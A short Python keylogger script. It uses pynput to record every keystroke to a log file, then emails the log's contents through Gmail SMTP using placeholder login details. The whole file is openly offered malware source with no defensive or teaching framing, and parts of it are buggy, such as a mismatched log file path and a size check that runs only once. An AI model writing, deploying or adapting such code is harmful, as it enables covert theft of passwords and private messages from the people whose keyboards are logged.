from pynput import keyboard
import logging
import smtplib
import os

logging.basicConfig(filename='log.txt',level=logging.DEBUG,format='%(asctime)s - %(levelname)s - %(message)s')

#Getting the file size
size_=os.path.getsize('log.txt')
size_=size_/1000

#Getting the current working directory
getdir=os.getcwd()

#Checking wether the file is greater than 0r equal to 4kb
if size_ >= 4:  
   with open('\\log.txt','r') as f1:
      read_=f1.read()
      conn=smtplib.SMTP('smtp.gmail.com',587)
      conn.starttls()
      conn.login('Type your email id','password')
      conn.sendmail('from','to','Subject: log\n\n'+ str(read_))

def on_press(key):
   logging.debug(key)

#getting the keyboard inputs using listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


